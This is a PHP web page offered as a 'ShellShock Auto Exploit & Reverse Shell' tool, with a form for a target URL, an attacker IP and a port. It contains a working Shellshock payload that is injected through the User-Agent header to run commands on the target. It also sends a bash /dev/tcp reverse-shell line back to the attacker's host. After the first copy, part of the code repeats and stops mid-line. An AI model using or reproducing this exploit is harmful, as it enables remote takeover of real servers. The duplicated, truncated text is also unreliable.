<html>
<h1>ShellShock Auto Exploit & Reverse Shell by GhostSecID</h1>
<form method="post">
Target: <br><input type="text" name="url" style="width: 400px; margin: 10px auto; " height="10" placeholder="http://www.target.com/"><br>
IP VPSmu: <br><input type="text" name="ip" style="width: 400px; margin: 10px auto; " height="10" placeholder="127.0.0.1"><br>
PORT Listening: <br><input type="text" name="port" style="width: 400px; margin: 10px auto; " height="10" placeholder="1337"><br>
<input type="submit" name="go" style="width: 400px; margin: 10px auto; " value="test">
</form>
</html>
<?php
// GhostSecID - Gh
function pwn($site,$cmd) {
	$useragent =  "() { :; }; echo; /bin/$cmd";
	$ch = curl_init($site);
		  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$postResult = curl_exec($ch);
	return $postResult;
}
$url = $_POST['url'];
$go = $_POST['go'];
$ip = $_POST['ip'];
$port = $_POST['port'];
if(isset($go)) {
	echo "<pre>";
	echo "=> $url<br>";
	echo "pwd: ". pwn($url, "pwd") ."<br>";
	echo "uname -a: ". pwn($url, "uname -a") . "<br>";
	echo "id: ". pwn($url, "bash -c 'id'") . "<br>";
	echo "whoami: ". pwn($url, "bash -c 'whoami'") . "<br>";
	echo pwn($url, 'bash -i >& /dev/tcp/'.$ip.'/'.$port.' 0>&1') . "<br>";
	echo "[ auto anu selesaiii bossqq ]<br><br>";
	echo "</pre>";
}
?>r>
PORT Listening: <br><input type="text" name="port" style="width: 400px; margin: 10px auto; " height="10" placeholder="1337"><br>
<input type="submit" name="go" style="width: 400px; margin: 10px auto; " value="test">
</form>
</html>
<?php
// GhostSecID - Gh
function pwn($site,$cmd) {
	$useragent =  "() { :; }; echo; /bin/$cmd";
	$ch = curl_init($site);
		  curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$postResult = curl_exec($ch);
	return $postResult;
}
$url = $_POST['url'];
$go = $_POST['go'];
$ip = $_POST['ip'];
$port = $_POST['port'];
if(isset($go)) {
	echo "<pre>";
	echo "=> $url<br>";
	echo "pwd: 
